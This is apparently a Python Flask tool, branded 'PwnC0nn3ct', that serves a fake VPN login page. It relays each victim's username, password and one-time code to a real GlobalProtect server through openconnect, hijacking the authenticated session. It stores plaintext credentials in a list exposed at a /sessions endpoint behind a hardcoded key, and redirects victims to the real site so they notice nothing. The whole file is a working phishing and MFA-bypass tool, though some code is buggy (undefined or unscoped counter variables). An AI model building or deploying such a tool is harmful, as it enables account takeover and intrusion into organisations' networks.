from flask import Flask, render_template, request, jsonify, redirect, url_for
import pexpect
import os
import logging
import argparse
import sys
import time

app = Flask(__name__)

# VPN server configuration
VPN_SERVER = os.getenv("VPN_SERVER")

# TUN counter
TUN = 0

# Redirect URL
REDIRECT_URL = os.getenv("REDIRECT_URL", f"https://{VPN_SERVER}")

# Password for Sessions
SESSIONS_KEY = os.getenv("SESSIONS_KEY", "PwnC0nn3ct")

# Secret key for Flask app
app.secret_key = os.getenv("SECRET_KEY", "PwnC0nn3ct")

# Dictionary to store ongoing processes by username
processes = {}

# Flattened sessions logs: a list of dictionaries with user details
sessions_logs = []  # Format: [{"username": username, "password": password, "pid": pid}]

# Ensure VPN_SERVER is set
if not VPN_SERVER:
    raise ValueError("VPN_SERVER environment variable is not set.")

if not "http" in REDIRECT_URL:
    raise ValueError("REDIRECT_URL is not a valid URL. Must start with http or https.")

# Parse CLI arguments
parser = argparse.ArgumentParser(description="Run Flask OpenConnect app")
parser.add_argument("-debug", action="store_true", help="Enable debugging mode")
args = parser.parse_args()

# Configure logging
LOG_LEVEL = "DEBUG" if args.debug else os.getenv("LOG_LEVEL", "INFO").upper()
logging.basicConfig(level=getattr(logging, LOG_LEVEL))
if args.debug:
    logging.info("Debugging mode enabled.")

def run_openconnect(username, password=None, otp=None):
    try:
        # Check if a process already exists for this user
        if username in processes:
            child = processes[username]
            logging.info(f"Resuming existing OpenConnect process for user: {username}")

            # Handle OTP
            if otp:
                child.sendline(otp)
                logging.info("OTP sent.")
                output = child.before
                logging.debug(f"Full output before OTP: {output}")
                # Wait to allow OpenConnect to process
                index = child.expect([r"Session authentication will expire", pexpect.EOF, pexpect.TIMEOUT], timeout=30)

                # Look for success indicators using regex
                if index == 0:
                    logging.info("VPN connection successfully established.")
                    return "success", output
                elif index == 1:
                    logging.error("OpenConnect completed but no success indicators found.")
                    return "failure", output
                elif index == 2:  # Timeout occurred
                    logging.warning("Timeout while waiting for successful connection.")
                    return "error", "Timeout waiting for OTP."
                    
            return "otp_required", None

        # Start a new OpenConnect process
        #Modificar --interfaces con el tun adecuado
        tunel=f"tun{TUN}"
        command = f"sudo openconnect --interface={tunel} --protocol=gp -u {username} {VPN_SERVER}"
        child = pexpect.spawn(command, encoding="utf-8", timeout=60)
        TUN=TUN+1

        # Log interaction for debugging
        logfile_path = f"openconnect_debug_{username}.log"
        child.logfile = open(logfile_path, "w")
        if args.debug:
            child.logfile_read = sys.stdout

        # Handle password prompt
        if password:
            child.expect("Password:")
            child.sendline(password)
            logging.info("Password sent.")

        # Wait for OTP prompt or process completion
        index = child.expect([r"Challenge:", pexpect.EOF, pexpect.TIMEOUT], timeout=30)
        output = child.before
        if index == 0:  # OTP required
            logging.info("OTP challenge detected.")
            processes[username] = child  # Store the process for later OTP submission
            sessions_logs.append({"username": username, "password": password, "pid": child.pid})  # Log user data
            return "otp_required", None
        elif index == 1:  # Process completed (EOF) | On success, increase TUN_INTERFACE counter
            tun=tun+1
            logging.info("OpenConnect process completed.")
            logging.debug(f"Full output after EOF: {output}")
        elif index == 2:  # Timeout occurred
            logging.warning("Timeout while waiting for OTP prompt or process completion.")
            return "error", "Timeout waiting for OTP."

    except Exception as e:
        logging.error(f"Error running OpenConnect: {e}")
        return "error", str(e)
    
@app.route("/")
def home():
    return render_template("login.html")

@app.route("/connect", methods=["POST"])
def connect():
    try:
        username = request.form.get("username")
        password = request.form.get("password")

        # Validate credentials
        if not username or not password:
            return jsonify({"error": "Missing username or password"}), 400

        status, result = run_openconnect(username, password=password)
        if status == "otp_required":
            return redirect(url_for("otp", username=username))
        elif status == "success":
            return jsonify({"status": "success", "message": "Connected successfully"}), 200
        else:
            return jsonify({"status": "error", "message": result}), 500

    except Exception as e:
        logging.error(f"Error in /connect: {e}")
        return jsonify({"error": "An error occurred", "details": str(e)}), 500

@app.route("/otp")
def otp():
    username = request.args.get("username")
    return render_template("otp.html", username=username)

@app.route("/sessions", methods=["GET"])
def sessions():
    password = request.args.get("p")
    if password == SESSIONS_KEY:
        try:
            # Return the flattened user logs
            return jsonify({"sessions": sessions_logs}), 200
        except Exception as e:
            logging.error(f"Error in /sessions: {e}")
            return jsonify({"error": "An error occurred", "details": str(e)}), 500
    else:
        logging.error("Invalid or missing password in /sessions request.")
        return redirect(url_for("home"))

@app.route("/submit-otp", methods=["POST"])
def submit_otp():
    try:
        otp = request.form.get("otp")
        username = request.form.get("username")

        # Log received data for debugging
        logging.debug(f"Received OTP: {otp}, Username: {username}")

        # Validate OTP and username
        if not username or not otp:
            logging.error("Missing username or OTP in the request.")
            return jsonify({"error": "Missing username or OTP"}), 400

        # Send OTP to the existing OpenConnect process
        status, result = run_openconnect(username, otp=otp)
        if status == "success":
            logging.info(f"VPN connection established. Redirecting user to {REDIRECT_URL}")
            return redirect(REDIRECT_URL)
        elif status == "failure":
            logging.error("OpenConnect failed to establish a VPN connection.")
            return jsonify({"status": "error", "message": "Failed to establish VPN connection."}), 500
        else:
            logging.error(f"OpenConnect OTP submission failed: {result}")
            return jsonify({"status": "error", "message": result}), 500

    except Exception as e:
        logging.error(f"Error in /submit-otp: {e}")
        return jsonify({"error": "An error occurred", "details": str(e)}), 500

if __name__ == "__main__":
    app.run(debug=args.debug)
